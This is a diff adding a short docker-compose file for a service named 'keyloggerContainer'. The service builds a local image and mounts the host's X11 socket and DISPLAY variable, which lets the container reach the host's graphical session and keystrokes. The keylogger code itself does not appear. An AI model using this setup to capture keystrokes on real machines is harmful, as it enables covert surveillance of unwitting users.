@@ -1,0 +1,12 @@
+version: '3.1'
+
+services:
+  keyloggerContainer: 
+    build: .
+    image: "kl:latest"
+    volumes:
+      - "/tmp/.X11-unix/:/tmp/.X11-unix/"
+    environment:
+      - DISPLAY=$DISPLAY
+
+
